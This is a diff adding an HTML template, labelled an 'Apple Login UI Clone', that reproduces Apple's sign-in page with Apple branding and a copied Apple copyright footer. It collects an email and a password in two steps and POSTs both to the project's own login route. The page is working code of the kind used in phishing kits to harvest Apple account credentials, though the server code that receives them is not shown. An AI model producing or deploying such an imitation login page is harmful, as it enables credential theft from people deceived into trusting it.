@@ -1,0 +1,188 @@
+<!DOCTYPE html> 
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Apple Login UI Clone</title>
+  <style>
+    body {
+      background-color: #f8f8f8;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+    }
+
+    .container {
+      background: #fff;
+      border-radius: 30px;
+      box-shadow: 0 14px 40px rgba(0,0,0,0.12);
+      padding: 90px 60px;
+      width: 100%;
+      max-width: 540px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 260px;
+      margin-bottom: 30px;
+    }
+
+    h2 {
+      font-size: 32px;
+      margin-bottom: 40px;
+      font-weight: 700;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 22px 20px;
+      font-size: 19px;
+      border: 1px solid #ccc;
+      border-radius: 14px;
+      outline: none;
+    }
+
+    .arrow-btn {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+    }
+
+    .arrow-btn svg {
+      width: 28px;
+      height: 28px;
+    }
+
+    .checkbox-group {
+      text-align: left;
+      margin: 20px 0;
+      font-size: 17px;
+    }
+
+    .checkbox-group input {
+      transform: scale(1.3);
+      margin-right: 10px;
+    }
+
+    .options {
+      margin-top: 20px;
+      font-size: 17px;
+    }
+
+    .options a {
+      display: block;
+      color: #0071e3;
+      text-decoration: none;
+      margin-top: 12px;
+    }
+
+    footer {
+      margin-top: 30px;
+      text-align: center;
+      font-size: 14px;
+      color: #888;
+    }
+
+    footer p {
+      margin: 4px 0;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="{{ url_for('static', filename='image/cloud.png') }}" class="logo" alt="Apple Logo">
+    <h2>Sign in with Apple Account</h2>
+
+    <!-- Step 1: Email Input -->
+    <div id="step1">
+      <div class="input-group">
+        <input type="text" name="email" id="emailInput" placeholder="Email or Phone Number" />
+        <button type="button" class="arrow-btn" onclick="showPassword()">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- Step 2: Password Input -->
+    <div id="step2" style="display: none;">
+      <form method="POST" action="{{ url_for('login') }}" id="loginForm">
+        <div class="input-group">
+          <!-- Display email for user -->
+          <input type="text" value="" id="finalEmail" disabled style="margin-bottom: 18px;" />
+          <!-- Hidden field to actually send email -->
+          <input type="hidden" name="email" id="hiddenEmail" />
+          
+          <input type="password" name="password" id="passwordInput" placeholder="Password" required />
+          <button type="button" class="arrow-btn" onclick="submitForm()">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/>
+            </svg>
+          </button>
+        </div>
+      </form>
+    </div>
+
+    <div class="checkbox-group">
+      <label><input type="checkbox"> Keep me signed in</label>
+    </div>
+
+    <div class="options">
+      <a href="#">Forgot password?</a>
+      <a href="#">Create Apple Account</a>
+    </div>
+  </div>
+
+  <footer>
+    <p>Apple ID is the account you use to access all Apple services.</p>
+    <p>Copyright © 2025 Apple Inc. All rights reserved.</p>
+  </footer>
+
+  <script>
+    function showPassword() {
+      const email = document.getElementById("emailInput").value.trim();
+      if (!email) {
+        alert("Please enter your email or phone number.");
+        return;
+      }
+      document.getElementById("finalEmail").value = email; // Display only
+      document.getElementById("hiddenEmail").value = email; // For submission
+      document.getElementById("step1").style.display = "none";
+      document.getElementById("step2").style.display = "block";
+      document.getElementById("passwordInput").focus();
+    }
+    
+    function submitForm() {
+      const password = document.getElementById("passwordInput").value.trim();
+      if (!password) {
+        alert("Please enter your password.");
+        return;
+      }
+      document.getElementById("loginForm").submit();
+    }
+    
+    // Allow form submission on Enter key press
+    document.getElementById("passwordInput").addEventListener("keypress", function(event) {
+      if (event.key === "Enter") {
+        event.preventDefault();
+        submitForm();
+      }
+    });
+  </script>
+</body>
+</html>
